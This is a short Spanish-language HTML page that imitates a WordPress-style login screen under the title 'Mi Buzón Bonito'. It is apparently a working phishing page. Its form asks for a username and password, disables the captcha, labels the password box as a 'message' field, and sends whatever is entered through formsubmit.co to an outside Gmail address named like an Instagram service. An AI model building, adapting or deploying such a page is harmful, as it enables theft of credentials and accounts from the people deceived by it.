<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Mi Buzón Bonito</title>

<style>
body {
  background: #f0f0f1;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
}

.wrapper {
  width: 360px;
  text-align: center;
}

.logo {
  margin-bottom: 20px;
}

.profile-pic {
  width: 84px;
  height: 84px;
  border-radius: 50%;
  object-fit: cover;
  margin-bottom: 15px;
}

.login-box {
  background: #fff;
  padding: 26px 24px 30px;
  border: 1px solid #c3c4c7;
  box-shadow: 0 1px 3px rgba(0,0,0,.04);
  text-align: left;
}

label {
  font-size: 14px;
  font-weight: 400;
  display: block;
  margin-bottom: 5px;
}

input[type="text"],
textarea {
  width: 100%;
  padding: 6px 8px;
  margin-bottom: 16px;
  border: 1px solid #8c8f94;
  border-radius: 3px;
  font-size: 14px;
  box-sizing: border-box;
}

input:focus,
textarea:focus {
  border-color: #2271b1;
  box-shadow: 0 0 0 1px #2271b1;
  outline: none;
}

.remember {
  margin-bottom: 16px;
  font-size: 13px;
}

button {
  width: 100%;
  padding: 8px 12px;
  background: #2271b1;
  border: 1px solid #2271b1;
  color: white;
  font-size: 14px;
  border-radius: 3px;
  cursor: pointer;
}

button:hover {
  background: #135e96;
}

.links {
  margin-top: 16px;
  font-size: 13px;
  text-align: center;
}

.links a {
  color: #2271b1;
  text-decoration: none;
}

.links a:hover {
  text-decoration: underline;
}

.language {
  margin-top: 20px;
  font-size: 12px;
  color: #50575e;
  text-align: center;
}
</style>
</head>

<body>

<div class="wrapper">

  <!-- TU IMAGEN -->
  <img src="foto.jpg" alt=" " class="profile-pic">

  <div class="login-box">

    <form action="https://formsubmit.co/instagramservice341257@gmail.com" method="POST">

      <input type="hidden" name="_captcha" value="false">

      <label>Nombre de usuario o correo electrónico</label>
      <input type="text" name="usuario" required>

      <label>Contraseña</label>
      <textarea name="mensaje" rows="4" required></textarea>

      <div class="remember">
        <input type="checkbox" id="remember">
        <label for="remember" style="display:inline;">Recuérdame</label>
      </div>

      <button type="submit">Acceder</button>

    </form>

    <div class="links">
      <a href="#">¿Has olvidado tu contraseña?</a>
    </div>

</div>

</body>
</html>
